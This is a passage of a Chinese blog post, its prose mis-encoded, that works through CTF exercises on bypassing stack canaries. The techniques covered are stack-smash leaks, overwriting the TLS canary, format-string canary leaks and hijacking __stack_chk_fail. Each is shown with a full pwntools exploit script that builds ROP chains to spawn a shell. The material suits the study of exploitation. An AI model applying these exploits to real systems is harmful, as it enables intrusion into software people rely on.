<p>sub_400A11å‡½æ•°</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">__int64 <span class="hljs-keyword">sub_400A11()</span><br><span class="hljs-keyword"></span>&#123;<br>  unsigned int <span class="hljs-built_in">v1</span><span class="hljs-comment">; // [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">v1</span> = fork();<br>  if ( <span class="hljs-built_in">v1</span> == -<span class="hljs-number">1</span> )<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;can not fork&quot;</span>);<br>  return <span class="hljs-built_in">v1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œforkäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶ä¸”åˆ¤æ–­ä¾æ®æ˜¯v7çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªç¨‹åºå¯ä»¥å´©æºƒ3æ¬¡<br>è¿™å§¿åŠ¿å’Œé¢˜ç›®æˆ‘ä¸“é—¨å†™äº†ä¸€ç¯‡ï¼Œæ€è·¯å¯ä»¥ç›´æ¥çœ‹<a href="https://n0vice.top/2020/04/09/Stack-smash/">stack smash</a></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#!/usr/bin/env python</span><br><span class="hljs-meta">#coding=utf-8</span><br>from pwn import*<br>import sys<br><span class="hljs-meta">#context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span></span><br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br><span class="hljs-built_in">binary</span> = <span class="hljs-string">&#x27;./pwn1&#x27;</span> <br><span class="hljs-keyword">local</span> = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">local</span> == <span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-built_in">binary</span>)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;&quot;</span>,)<br>elf=ELF(<span class="hljs-built_in">binary</span>)<br>libc=elf.libc<br>def <span class="hljs-built_in">exp</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload)<br>    p.recvuntil(<span class="hljs-string">&quot;*** stack smashing detected ***: &quot;</span>)<br>    puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(environ)<br>    p.sendline(payload)<br>    p.recvuntil(<span class="hljs-string">&quot;*** stack smashing detected ***: &quot;</span>)<br>    stack_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;stack_addr==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br>    flag = stack_addr - <span class="hljs-number">0x168</span><br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(flag)<br>    p.sendline(payload)<br>    p.interactive()<br><span class="hljs-built_in">exp</span>()<br></code></pre></td></tr></table></figure>

<h4 id="warn"><a href="#warn" class="headerlink" title="warn"></a>warn</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨glibc2.27åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­å·²å¤±æ•ˆ<br>æˆ‘ä»¬ç»§ç»­åˆ†æ2.27çš„æºç <br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/8.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/8.png" alt="img"></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/9.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/9.png" alt="img"></a><br>å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œ__fortify_fail_abortå‡½æ•°æ—¶å¤šä¼ å…¥äº†ä¸€ä¸ªneed_backtraceå‚æ•°ï¼Œè€Œæ•´ä¸ªå‚æ•°åœ¨å‰é¢å°±å·²ç»å†™æ­»æˆfalseäº†ï¼Œæ‰€ä»¥æ‰§è¡Œ__libc_messageå‡½æ•°æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¹Ÿè¢«å†™æ­»æˆäº†â€<unknown>â€å­—ç¬¦ä¸²ï¼Œæ‰“å°ä¸äº†æ ˆä¸­çš„ä¿¡æ¯äº†</unknown></p>
<h2 id="ä¿®æ”¹TLSç»“æ„ä½“"><a href="#ä¿®æ”¹TLSç»“æ„ä½“" class="headerlink" title="ä¿®æ”¹TLSç»“æ„ä½“"></a>ä¿®æ”¹TLSç»“æ„ä½“</h2><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“canaryæ˜¯ä»<strong>å“ªé‡Œ</strong></p>
<p>è¢«å–å‡ºæ¥çš„<br>éšä¾¿æŸ¥çœ‹ä¸€ä¸ª64ä½çš„ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»fsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»çš„ä½ç½®å–å‡ºæ¥çš„<br>è€Œåˆå§‹åŒ–canaryæ—¶ï¼Œfså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®å°±æ˜¯TLSç»“æ„ä½“<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/11.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/11.png" alt="img"></a><br>è¿™ä¸ªè¢«å®šä¹‰åœ¨glibc/sysdeps/x86_64/nptl/tls.hä¸­ç»“æ„ä½“tcbhead_tå°±æ˜¯ç”¨æ¥æè¿°TLSçš„<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/12.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/12.png" alt="img"></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/13.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/13.png" alt="img"></a><br>ä»¥ä¸Šæ˜¯libc_start_mainå…³äºcanaryç”Ÿæˆçš„è¿‡ç¨‹ï¼Œ_dl_randomæ˜¯å†…æ ¸æä¾›çš„éšæœºæ•°ç”Ÿæˆå™¨<br>fsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»å¤„çš„å˜é‡uintptr_t stack_chk_guardå°±æ˜¯canaryçš„å€¼</p>
<h3 id="ä¾‹é¢˜ï¼š-CTF2018-babystack"><a href="#ä¾‹é¢˜ï¼š-CTF2018-babystack" class="headerlink" title="ä¾‹é¢˜ï¼š*CTF2018 babystack"></a>ä¾‹é¢˜ï¼š*CTF2018 babystack</h3><p>åˆ†æä»£ç <br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><img src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png" alt="img"></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/15.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/15.png" alt="img"></a><br>ç¨‹åºåœ¨mainå‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªå­çº¿ç¨‹ï¼Œå¹¶åœ¨å…¶ä¸­è°ƒç”¨æ ˆæº¢å‡ºå‡½æ•°ï¼Œé¦–å…ˆè¾“å…¥sizeï¼Œç„¶åè¯»å…¥sizeå¤§å°çš„å­—ç¬¦<br>åœ¨å¤šçº¿ç¨‹ä¸­TLSå°†è¢«æ”¾ç½®åœ¨å¤šçº¿ç¨‹çš„æ ˆçš„é¡¶éƒ¨ï¼Œå› æ­¤æˆ‘ä»¬èƒ½ç›´æ¥é€šè¿‡æ ˆæº¢å‡ºå¯¹canaryåˆå§‹å€¼è¿›è¡Œæ›´æ”¹</p>
<h4 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h4><p>æ–­ç‚¹åœ¨mainå‡½æ•°ï¼ŒæŸ¥çœ‹canaryçš„åœ°å€ï¼Œåªèƒ½å‘ç°stackå’Œtlsç»“æ„ä½“ä¸­ä¸¤ä¸ªcanaryçš„å€¼<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/16.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/16.png" alt="img"></a><br>å†æ–­ç‚¹åˆ°çº¿ç¨‹å‡½æ•°ï¼Œæœç´¢canaryï¼Œä¼šå‘ç°tlsè¢«åˆå§‹åŒ–äº†ï¼Œå°±æ˜¯å¤šçº¿ç¨‹å‡½æ•°åœ¨libcä¸Šæ–¹mmapä¸€æ®µç©ºé—´ç”¨æ¥å¼€è¾Ÿäº†ä¸€ä¸ªæ–°çš„tlsç»“æ„<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/18.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/18.png" alt="img"></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/17.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/17.png" alt="img"></a><br>å¹¶ä¸”è¿™ä¸ªtlsç»“æ„é™¤äº†canaryå…¶ä»–éƒ½æ²¡æœ‰ç”¨ï¼Œè¿™æ®µç©ºé—´é‡Œé¢çš„æ•°æ®éƒ½æ˜¯éšä¾¿å¯å†™çš„<br>æˆ‘ä»¬å¯ä»¥gdb.attachç»™canaryå‰çš„å˜é‡æ–­ç‚¹ï¼Œç„¶åcontinueï¼Œå¦‚æœæ‰“é€šäº†ï¼Œè¯´æ˜æ²¡æœ‰é‡åˆ°æ–­ç‚¹ï¼Œå³åœ¨å­çº¿ç¨‹ä¸­canaryä¹‹å‰çš„å˜é‡ä¸éœ€è¦ç”¨åˆ°çš„ç³»ç»Ÿè°ƒç”¨æ— å…³<br>ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œåœ¨canaryä¹‹å‰çš„é‚£å‡ ä¸ªå˜é‡ï¼Œåœ¨æ­£å¸¸ç¨‹åºä¸­ä¸ç³»ç»Ÿè°ƒç”¨æœ‰å…³ï¼Œä¸èƒ½ç›´æ¥æ”¹å†™ï¼Œä¸€èˆ¬åˆ©ç”¨æ•°ç»„è¶Šç•Œæ¥è·³è¿‡ä»–ä»¬å»æ”¹å†™canary<br>iæ˜¥ç§‹å…¬ç›ŠCTF_BFnoteè¿™é¢˜å°±æ˜¯åˆ©ç”¨æ•°ç»„è¶Šç•Œè·³è¿‡å®ƒä»¬å»æ”¹å†™canary<br>åœ¨å†…å­˜é‡Œå¤§æ¦‚é•¿è¿™æ ·<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/19.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/19.png" alt="img"></a></p>
<h4 id="æ•´ä½“æ€è·¯"><a href="#æ•´ä½“æ€è·¯" class="headerlink" title="æ•´ä½“æ€è·¯"></a>æ•´ä½“æ€è·¯</h4><p>â‘ è§¦å‘æ ˆæº¢å‡ºï¼Œå°†Canaryè¦†ç›–ä¸ºaaaaaaaaï¼ŒåŒæ—¶ä½¿ç”¨è¶…é•¿çš„payloadå°†TLSä¸­çš„Canaryä¸€å¹¶è¦†ç›–ä¸ºaaaaaaaa<br>â‘¡æ ˆè¿ç§»åˆ°bssæ®µ<br>â‘¢ROP</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span>=process(<span class="hljs-string">&quot;./bs&quot;</span>)<br><span class="hljs-attribute">libc</span> = ELF(&#x27;/lib/x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>-linux-gnu/libc.so.<span class="hljs-number">6</span>&#x27;)<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">03</span><br><span class="hljs-attribute">pop_rsi_r15</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">01</span><br><span class="hljs-attribute">read_plt</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4007</span>e<span class="hljs-number">0</span><br><span class="hljs-attribute">puts_got</span>=<span class="hljs-number">0</span>x<span class="hljs-number">601</span>fb<span class="hljs-number">0</span><br><span class="hljs-attribute">put_plt</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4007</span>c<span class="hljs-number">0</span><br><span class="hljs-attribute">buf</span>=<span class="hljs-number">0</span>x<span class="hljs-number">602</span>f<span class="hljs-number">00</span><br><span class="hljs-attribute">leave_ret</span>=<span class="hljs-number">0</span>x<span class="hljs-number">400955</span><br><br><span class="hljs-attribute">payload</span> = p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(puts_got)+p<span class="hljs-number">64</span>(put_plt)<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(pop_rsi_r<span class="hljs-number">15</span>)+p<span class="hljs-number">64</span>(buf+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(read_plt)+p<span class="hljs-number">64</span>(leave_ret)<br><br><span class="hljs-attribute">print</span> p.recvuntil(<span class="hljs-string">&quot;How many bytes do you want to send?&quot;</span>)<br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">6128</span>))<br><span class="hljs-attribute">p</span>.send(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4112</span>+p<span class="hljs-number">64</span>(buf)+payload+<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">6128</span>-<span class="hljs-number">4120</span>-len(payload)))<br><br><span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(p.recvuntil(&#x27;\x<span class="hljs-number">7</span>f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,&#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">libc_base</span> = puts_addr - libc.sym[&#x27;puts&#x27;]<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + hex(puts_addr))<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + hex(libc_base))<br><span class="hljs-attribute">system</span> = libc_base+libc.sym[&#x27;system&#x27;]<br><span class="hljs-attribute">binsh</span> = libc_base+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;system_addr==&gt;&quot;</span> + hex(system))<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;binsh==&gt;&quot;</span> + hex(binsh))<br><br><span class="hljs-attribute">p</span>.sendline(p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(binsh)+p<span class="hljs-number">64</span>(system))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²leak-canary"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²leak-canary" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²leak canary"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²leak canary</h2><p>é’ˆå¯¹æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ ˆæº¢å‡ºç¨‹åºï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥ä»»æ„åœ°å€è¯»å†™çš„ç‰¹ç‚¹ï¼Œæ³„éœ²å‡ºæ ˆä¸Šçš„canaryï¼Œå¹¶å¡«å…¥å¯¹åº”ä½ç½®ï¼Œç„¶ååˆ©ç”¨æ ˆæº¢å‡ºget shell<br>è¿™é‡Œæˆ‘æ‰¾äº†ä¸€ä¸ªå…¸å‹çš„ä¾‹é¢˜ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—ä¸€ä¸‹åç§»ï¼Œç„¶ååˆ©ç”¨%pæ¥æ³„éœ²canary</p>
<h3 id="ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017-Mary-Morton"><a href="#ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017 Mary_Morton"></a>ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017 Mary_Morton</h3><p>mainå‡½æ•°<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/20.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/20.png" alt="img"></a><br>æœ‰é€‰é¡¹å¯ä»¥é€‰<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/21.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/21.png" alt="img"></a><br>é€‰é¡¹2æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/22.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/22.png" alt="img"></a><br>é€‰é¡¹1æœ‰æ ˆæº¢å‡ºæ¼æ´<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/23.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/23.png" alt="img"></a><br>è¿˜æœ‰åé—¨<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/24.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/24.png" alt="img"></a><br>å¼€äº†canaryä¿æŠ¤<br>æ„å‘³ç€è¦ä¹ˆæº¢å‡ºå»è§¦å‘canaryï¼Œè¦ä¹ˆåªèƒ½åˆ©ç”¨ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å†…å­˜<br>æˆ‘ä»¬é¦–å…ˆç¡®å®šåˆ°å¯æ§è¾“å…¥ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬å‡ ä¸ªå‚æ•°<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/25.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/25.png" alt="img"></a><br>å°è¯•ä¸€ç•ªå¯ä»¥å‘ç°æ˜¯ç¬¬6ä¸ªå‚æ•°çš„ä½ç½®<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><img src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png" alt="img"></a><br>ç„¶åè®¡ç®—å‡ºbufå’Œcanaryä¹‹é—´çš„è·ç¦»ä¸º0x90-0x8=0x88=136<br>è¿™æ˜¯ä¸ª64ä½ç¨‹åºï¼Œ8å­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œ136/8=17ï¼Œé‚£ä¹ˆcanaryè·ç¦»æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°23ï¼ˆ17+6ï¼‰ä¸ªå‚æ•°çš„è·ç¦»<br>å¯ä»¥åˆ©ç”¨%23$pæ¥leak canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/27.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/27.png" alt="img"></a><br>nice<br>æ¥ä¸‹æ¥å°±æŠŠcanaryå¡«å…¥rbp-8çš„ä½ç½®ç„¶året2textå°±å½³äºäº†</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">p</span> = process(&#x27;./Mary_Morton&#x27;)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">3</span>. Exit the battle&#x27;)<br><span class="hljs-attribute">p</span>.sendline(&#x27;<span class="hljs-number">2</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;%23$p&quot;</span>)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">0</span>x&#x27;)<br><span class="hljs-attribute">canary</span> = int(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;canary==&gt;&quot;</span> + hex(canary))<br><span class="hljs-attribute">system</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4008</span>DA<br><span class="hljs-attribute">payload</span> = &#x27;a&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xdeadbeef) + p<span class="hljs-number">64</span>(system)<br><span class="hljs-attribute">p</span>.sendline(&#x27;<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="åŠ«æŒ-stack-chk-failå‡½æ•°"><a href="#åŠ«æŒ-stack-chk-failå‡½æ•°" class="headerlink" title="åŠ«æŒ__stack_chk_failå‡½æ•°"></a>åŠ«æŒ__stack_chk_failå‡½æ•°</h2><p>æ”¹å†™__stack_chk_fail@gotï¼Œä½†å‰ææ˜¯å¿…é¡»æœ‰ä¸€ä¸ªå¯ä»¥å‘ä»»æ„åœ°å€å†™çš„æ¼æ´ï¼Œä¾‹å¦‚è¯´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<br>è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºåªèƒ½è¾“å…¥ä¸€æ¬¡çš„ç¨‹åºï¼Œå¦‚æœè¯´å¯ä»¥åˆ©ç”¨å¤šæ¬¡çš„è¯å°±å¯ä»¥åƒä¸Šé¢ä¸€æ ·ç›´æ¥æ³„éœ²canaryäº†</p>
<h3 id="ä¾‹é¢˜ï¼š-BJDCTF-2nd-r2t4"><a href="#ä¾‹é¢˜ï¼š-BJDCTF-2nd-r2t4" class="headerlink" title="ä¾‹é¢˜ï¼š[BJDCTF 2nd]r2t4"></a>ä¾‹é¢˜ï¼š[BJDCTF 2nd]r2t4</h3><p>ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œåˆ†æä¸‹<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/28.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/28.png" alt="img"></a><br>å­˜åœ¨æº¢å‡ºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ‰canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/29.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/29.png" alt="img"></a><br>æœ‰åé—¨<br>ç›´æ¥æ”¹å†™__stack_chk_fail@gotä¸ºbackdoor<br>è¿™ä¸ªé¢˜é™åˆ¶ä¸å¤šï¼Œå¯ä»¥ç›´æ¥ç”¨fmtstr_payloadæ¨¡å—ä¸€æŠŠæ¢­<br>å½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ„é€ <br>ä½†æ˜¯æˆ‘è¿˜æ²¡åšæ‰‹åŠ¨æ„é€ æ‰“çš„ï¼ˆæ‡’ğŸ•</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">p</span>=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28676</span>)<br><span class="hljs-comment">#p = process(&quot;./r2t4&quot;)</span><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./r2t4&quot;</span>)<br><span class="hljs-attribute">libc</span> = elf.libc<br><span class="hljs-attribute">stack_check</span> = <span class="hljs-number">0</span>x<span class="hljs-number">601018</span><br><span class="hljs-attribute">flag_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400626</span><br><span class="hljs-attribute">payload</span> = fmtstr_payload(<span class="hljs-number">6</span>,&#123;stack_check:flag_addr&#125;).ljust(<span class="hljs-number">40</span>,&#x27;a&#x27;)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

